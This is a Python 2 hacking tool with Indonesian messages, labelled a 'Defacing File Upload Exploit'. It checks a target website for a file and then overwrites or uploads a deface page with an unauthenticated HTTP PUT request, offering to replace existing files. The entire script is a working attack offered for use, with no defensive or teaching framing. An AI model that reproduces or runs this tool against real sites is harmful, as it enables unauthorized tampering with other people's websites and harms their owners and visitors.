#!/usr/bin/python

import requests
import string
import random
import sys
import os
from termcolor import colored

os.system("clear")

print(colored('''  88888888888888888888888888888888888888888888888888888888888888
  88\t		  				      88
  88  db   dD  .d8b.  db      d888888b      .d888b.           88
  88  88 ,8P' d8' `8b 88        `88'        8P   8D           88     
  88  88,8P   88ooo88 88         88         `Vb d8'           88      
  88  88`8b   88~~~88 88         88          d88C dD          88     
  88  88 `88. 88   88 88booo.   .88.        C8' d8D           88     
  88  YP   YD YP   YP Y88888P Y888888P      `888P Yb          88        
  88\t                                      		      88
  88                                                          88
  88  d888888b d88888b d8888b. .88b  d88. db    db db    db   88
  88  `~~88~~' 88'     88  `8D 88'YbdP`88 88    88 `8b  d8'   88
  88     88    88ooooo 88oobY' 88  88  88 88    88  `8bd8'    88
  88     88    88~~~~~ 88`8b   88  88  88 88    88  .dPYb.    88
  88     88    88.     88 `88. 88  88  88 88b  d88 .8P  Y8.   88
  88     YP    Y88888P 88   YD YP  YP  YP ~Y8888P' YP    YP   88
  88\t	  					      88''','blue'))
print(colored("  88888888888888888888888888888888888888888888888888888888888888",'blue'))
print(colored("                         Author : Miku Desu",'cyan'))
print(colored("                         Fanspage : Kali & Termux",'cyan'))
def miku():
  sc = ''
  with open(sys.argv[2], 'rb') as f:
      depes = f.read()
  script = depes
  host = sys.argv[1]
  if not host.startswith('http'):
    host = 'http://' + host
  nama = '/'+sys.argv[2]


  print("[*] Upload File Nama : %s") % (sys.argv[2])
  print("[*] Uploading %d bytes, Script Baru") % len(script)

  r = requests.request('put', host + nama, data=script, headers={'Content-Type':'application/octet-stream'})

  if r.status_code < 200 or r.status_code >= 300:
    print("[!] Upload Gagal . . .")
    sys.exit(1)
  else:
    print("[+] File Terupload . . .")
    print("[+] PATH : "+host + nama)


def cekfile():
 print("""
[*] Defacing File Upload Exploit
[*] Code Dengan Python 2.7 Bye Miku Desu
[*] Terimakasih, Dan Selamat Berjumpa
""")
 print("[*] Cek File Di Target : "+sys.argv[1]+"/"+sys.argv[2])
 r = requests.get(sys.argv[1] +"/"+ sys.argv[2])
 if r.status_code == requests.codes.ok:
  print("[*] Di Temukan File Yg Sama Di Target . . .")
  tanya = raw_input("[!] Replace File Target ? [gass/N] > ")
  if tanya == "gass":
   miku()
  else:
    print("[!] Keluar Tools . . .")
    sys.exit()
 else:
    print("[*] File Gk Di Target . . .")
    print("[*] Memproses Upload ScriptDeface Anda . . .")
    miku()


if __name__ == '__main__':
  if len(sys.argv) != 3:
    print("\n[*] Gunakan: python2 "+sys.argv[0]+" | Website_Target | Taruh ScriptDeface Anda Di Folder Ini\n")
    sys.exit(0)
  else:
     cekfile()
